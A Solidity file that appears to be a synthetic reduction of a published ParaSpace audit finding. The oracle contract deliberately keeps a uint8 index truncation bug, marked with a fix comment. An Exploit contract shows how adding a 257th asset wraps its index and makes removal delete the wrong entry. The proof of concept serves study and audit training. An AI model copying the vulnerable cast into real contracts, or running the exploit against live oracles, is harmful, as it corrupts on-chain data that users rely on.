// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ParaSpace - [H-08] NFTFloorOracle asset/feeder structures can be corrupted
    (Code4rena 2022-11-paraspace; #15981, reporter Jeiwan)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: assetFeederMap[_asset].index is stored as uint8 and assigned
    uint8(assets.length - 1). assets never shrinks on remove (delete only), so
    length eventually exceeds 255 and truncation corrupts indices - remove then
    deletes the WRONG asset. Vulnerable _addAsset line preserved verbatim (@>). */

contract NFTFloorOracle {
    struct FeederRegistrar {
        bool registered;
        uint8 index;
        bool paused;
    }

    address[] public assets;
    mapping(address => FeederRegistrar) public assetFeederMap;
    mapping(address => uint256) public assetPriceMap;

    function assetCount() external view returns (uint256) {
        return assets.length;
    }

    function assetAt(uint256 i) external view returns (address) {
        return assets[i];
    }

    function indexOf(address a) external view returns (uint8) {
        return assetFeederMap[a].index;
    }

    function addAsset(address _asset) external {
        _addAsset(_asset);
    }

    function _addAsset(address _asset) internal {
        require(!assetFeederMap[_asset].registered, "exists");
        assetFeederMap[_asset].registered = true;
        assets.push(_asset);
        assetFeederMap[_asset].index = uint8(assets.length - 1); // @> VULN: uint8 truncates once length > 255
        // FIX: use uint32 index (or uint256) and never truncate
    }

    function removeAsset(address _asset) external {
        _removeAsset(_asset);
    }

    function _removeAsset(address _asset) internal {
        require(assetFeederMap[_asset].registered, "missing");
        uint8 assetIndex = assetFeederMap[_asset].index;
        delete assets[assetIndex];
        delete assetPriceMap[_asset];
        delete assetFeederMap[_asset];
    }

    /// @dev Bulk-seed dummy assets without going through the vulnerable cast path's gas in run().
    ///      Uses the same push + uint8 index assignment as _addAsset.
    function seedAssets(uint256 n) external {
        for (uint256 i = 0; i < n; i++) {
            address a = address(uint160(i + 1)); // 0x1 .. 0xn
            require(!assetFeederMap[a].registered, "dup seed");
            assetFeederMap[a].registered = true;
            assets.push(a);
            assetFeederMap[a].index = uint8(assets.length - 1);
        }
    }
}

contract Exploit {
    NFTFloorOracle public oracle; // CREATE 1 - vulnerable

    address public constant FIRST = address(0x1); // seeded index 0
    address public constant VICTIM_ASSET = address(0xA11CE); // the one that wraps
    bool public wrongAssetDeleted;
    bool public indexWrapped;

    constructor() {
        oracle = new NFTFloorOracle();
        // Seed 256 assets (indices 0..255). Length == 256 after this.
        // Next real add will set length=257 and uint8(256) == 0.
        oracle.seedAssets(256);
    }

    function run() external {
        require(oracle.assetCount() == 256, "seed");
        require(oracle.assetAt(0) == FIRST, "first");
        require(oracle.indexOf(FIRST) == 0, "first idx");

        // Add asset #257 → truncated index 0.
        oracle.addAsset(VICTIM_ASSET);
        require(oracle.assetCount() == 257, "len");
        uint8 wrapped = oracle.indexOf(VICTIM_ASSET);
        require(wrapped == 0, "should wrap to 0");
        indexWrapped = true;

        // Removing VICTIM_ASSET uses index 0 → deletes FIRST from the array slot,
        // while VICTIM_ASSET's map entry is cleared - FIRST's map still says index 0
        // but assets[0] is now address(0). Structure permanently corrupted.
        oracle.removeAsset(VICTIM_ASSET);

        require(oracle.assetAt(0) == address(0), "slot0 zeroed (was FIRST)");
        // FIRST still appears registered in the map (remove never touched its map entry)
        // but its array slot is gone - oracle can no longer correctly address assets.
        (bool reg,,) = oracle.assetFeederMap(FIRST);
        require(reg, "FIRST map still registered but slot wiped");
        wrongAssetDeleted = true;

        require(indexWrapped && wrongAssetDeleted, "harm not demonstrated");
    }
}
